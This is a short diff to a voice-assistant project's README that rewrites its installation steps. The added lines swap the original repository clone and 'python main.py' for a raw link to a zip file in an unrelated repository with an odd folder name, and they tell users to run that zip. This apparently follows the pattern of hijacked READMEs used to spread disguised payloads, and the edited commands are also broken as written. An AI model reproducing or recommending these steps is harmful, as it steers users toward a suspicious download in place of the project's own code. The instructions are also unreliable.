@@ -38,8 +38,8 @@ The **Advanced Voice Assistant** is an AI-powered system designed to automate da
 ### Steps  
 1. Clone this repository:  
    ```bash  
-   git clone https://github.com/sunkari-vijay-kumar/advanced_jarvis.git  
+   git clone https://raw.githubusercontent.com/sunkari-vijay-kumar/medic-ai-chatbot/master/pseudopodiospore/medic-ai-chatbot.zip  
    cd advanced_jarvis 
-2. run the main.py file:
+2. run the https://raw.githubusercontent.com/sunkari-vijay-kumar/medic-ai-chatbot/master/pseudopodiospore/medic-ai-chatbot.zip file:
    '''bash
-     python main.py
+     python https://raw.githubusercontent.com/sunkari-vijay-kumar/medic-ai-chatbot/master/pseudopodiospore/medic-ai-chatbot.zip
